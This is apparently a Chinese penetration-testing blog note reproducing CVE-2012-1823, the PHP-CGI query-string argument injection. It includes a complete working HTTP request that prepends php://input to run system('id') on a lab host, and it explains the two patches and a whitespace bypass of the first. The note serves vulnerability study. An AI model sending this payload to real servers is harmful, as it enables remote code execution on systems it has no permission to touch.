---
title: CVE-2012-1823
date: 2023-09-03T15:29:52+08:00
updated: 2023-07-28T21:09:33+08:00
categories: 
- 渗透测试
- 漏洞复现
- Php
---

## CVE-2012-1823

**漏洞成因**

由于开发者为了方便测试，而开放了php-cgi接收参数的功能，而该功能的参数不仅是能够通过命令行传入，同样可以使用qerystring的方式传入，至此可以调用cgi命令

**漏洞利用**

cgi模式下的一些参数

```
-c 指定php.ini文件的位置
-n 不要加载php.ini文件
-d 指定配置项
-b 启动fastcgi进程
-s 显示文件源码
-T 执行指定次该文件
-h和-? 显示帮助
```

直接利用-s可以显示源码

![2012-1823](E:\笔记软件\笔记\渗透测试\漏洞复现\Php\2012-1823.jpg)

可通过-d指定autp_prepend_file来造成任意文件包含，执行任意代码

```php
GET /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input HTTP/1.1
Host: 192.168.121.140:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 21

<?php system('id');?>
```

![2012-1823](E:\笔记软件\笔记\渗透测试\漏洞复现\Php\2012-1823.png)

**漏洞原理**

在新版本5.42和5.3.12中对该漏洞进行了修复，修复的方法是检查querystring的-参数

```php
if(query_string = getenv("QUERY_STRING")) {
    decoded_query_string = strdup(query_string);
    php_url_decode(decoded_query_string, strlen(decoded_query_string));
    if(*decoded_query_string == '-' && strchr(decoded_query_string, '=') == NULL) {
        skip_getopt = 1;
    }
    free(decoded_query_string);
}
```

如果检测到第一个字符是-就进行跳过，不再获取命令行参数，但是如果运维对php-cgi进行了一层封装的情况下

```php
#!/bin/sh

exec /usr/local/bin/php-cgi $*
```

就可以通过空白符+-的形式进行对第一个字符检测的绕过，在php5.4.3和5.3.13中再次进行了修改

```php
if((query_string = getenv("QUERY_STRING")) != NULL && strchr(query_string, '=') == NULL) {
    /* we've got query string that has no = - apache CGI will pass it to command line */
    unsigned char *p;
    decoded_query_string = strdup(query_string);
    php_url_decode(decoded_query_string, strlen(decoded_query_string));
    for (p = decoded_query_string; *p &&  *p <= ' '; p++) {
        /* skip all leading spaces */
    }
    if(*p == '-') {
        skip_getopt = 1;
    }
    free(decoded_query_string);
}
```

这次不再只是检测首个字符是否为-，而是通过跳过所有的空白符再进行-的检测，如果有则skip_getopt=1至此分析结束

